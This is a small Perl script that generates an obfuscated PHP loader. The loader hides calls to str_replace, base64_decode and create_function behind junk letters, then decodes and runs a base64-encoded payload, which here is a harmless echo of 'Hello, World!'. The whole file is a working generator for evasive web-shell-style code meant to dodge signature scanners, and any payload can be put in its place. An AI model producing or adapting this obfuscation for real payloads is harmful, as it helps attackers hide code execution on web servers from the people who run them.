#!/usr/bin/perl
use strict;
use warnings;
use MIME::Base64;

my $payload = 'eval("echo \'Hello, World!\';");';
my $base64 = encode_base64($payload);
my $template = << "__EOF__";
<?php
\$a = str_replace("y","","ystyry_yryepylyayce");
\$b  = \$a("k", "", "kbkakske6k4k_dkekckodke");
\$c = \$a("j","","jcrjejajtje_fjujnjctjiojn");
\$d = \$c('', \$b("$base64"));
\$d();
__EOF__
print $template;
